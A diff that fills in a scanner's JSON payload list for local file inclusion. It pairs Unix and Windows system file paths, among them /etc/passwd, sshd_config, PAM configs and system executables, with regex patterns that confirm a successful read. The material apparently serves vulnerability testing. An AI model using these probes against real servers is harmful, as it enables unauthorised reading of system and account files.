@@ -1,4 +1,93 @@
 {
     "description": "Local File Inclusion",
-    "payloads": []
+    "payloads": [
+            {
+            "payload": [
+                    "/etc/passwd",
+                    "/etc/apache2/apache2.conf",
+                    "/usr/local/etc/nginx/nginx.conf",
+                    "/etc/ssh/sshd_config",
+                    "/etc/bluetooth/input.conf",
+                    "/etc/bluetooth/main.conf",
+                    "/etc/bluetooth/network.conf",
+                    "/etc/cups/cupsd.conf",
+                    "/etc/adduser.conf",
+                    "/etc/ca-certificates.conf",
+                    "/etc/security/access.conf",
+                    "/etc/security/group.conf",
+                    "/etc/security/limits.conf",
+                    "/etc/security/namespace.conf",
+                    "/etc/security/pam_env.conf",
+                    "/etc/security/sepermit.conf",
+                    "/etc/ssh/sshd_config",
+                    "/etc/group",
+                    "/etc/group-",
+                    "/etc/passwd"
+            ],
+            "verify": [
+                        "# System-wide .bashrc file for interactive bash(1) shells.",
+                        "To enable the settings / commands in this file for login shells as well",
+                        "# Configuration file for the input service",
+                        "This section contains options which are not specific",
+                        "The HID Profile does not specify that devices must be bonded",
+                        "Defaults to true to maximize device compatibility.",
+                        "[General] # Defaults to",
+                        "Multiple Profiles Single Device (MPSD) configuration",
+                        "N = 0xXX Report advertisements every N x 100 msec (range: 0x01 to 0xFE) # 0xFF Report only one advertisement per device during monitoring period # Default: 0xFF #RSSISamplingPeriod=0xFF",
+                        "Do reverse service discovery for previously unknown devices that connect to",
+                        "# Configuration file for the network service",
+                        "# Configuration file for the CUPS scheduler",
+                        "# /etc/adduser.conf: `adduser' configuration",
+                        "# This file lists certificates that you wish to use or to ignore to be",
+                        "# Login access control table.",
+                        "# This is the configuration file for the pam_group module.",
+                        "# /etc/security/limits.conf",
+                        "# /etc/security/namespace.conf",
+                        "# This is the configuration file for pam_env, a PAM module to",
+                        "# /etc/security/sepermit.conf",
+                        "# This is the sshd server system-wide configuration file. See # sshd_config(5)",
+                        "([\\w]+:.*[0-9]: ?){2,}",
+                        "([\\w]+:.*[0-9]: ?\\w+:\\/\\w+:(\\/?\\w+\\/?)+){2,}"
+            ],
+            "tags": ["unix", "linux"],
+            "type": "REGEX"
+        },
+            {
+            "payload": [
+                "ls", "cat", "mkdir", "rmdir", "cp", "ln", "mv", "chown", "chmod", "dd", "df", "tar", "less", "diff", "free", "tee", "truncate", "cut", "tr", "sort", "uniq", "head", "tail", "wc", "strings"
+            ],
+            "tags": ["unix", "linux"],
+            "verify": [
+                "\\x7fELF\\x02\\x01\\x01"
+            ],
+            "tags": ["unix", "linux"],
+            "type": "REGEX"
+        },
+            {
+            "payload": [
+                    "C:\\Windows\\System32\\PING.EXE",
+                    "C:\\Windows\\System32\\ipconfig.exe",
+                    "C:\\Windows\\System32\\systeminfo.exe",
+                    "C:\\Windows\\System32\\shutdown.exe",
+                    "C:\\Windows\\System32\\tasklist.exe",
+                    "C:\\Windows\\System32\\diskpart.exe",
+                    "C:\\Windows\\System32\\net.exe"
+                ],
+            "verify": [
+                "\\x50\\x45\\x00\\x00"
+            ],
+            "tags": ["windows"],
+            "type": "REGEX"
+        },
+            {
+            "payload": [
+                    "C:\\Windows\\Logs\\CBS\\CBS.log"
+                ],
+            "verify": [
+                "(\\d\\d\\d\\d-\\d\\d?-\\d\\d? \\d\\d:\\d\\d:\\d\\d, Info\\W+CBS\\W+[\\w\\W]+\n){10,}"
+            ],
+            "tags": ["windows"],
+            "type": "REGEX"
+        }
+    ]
 }
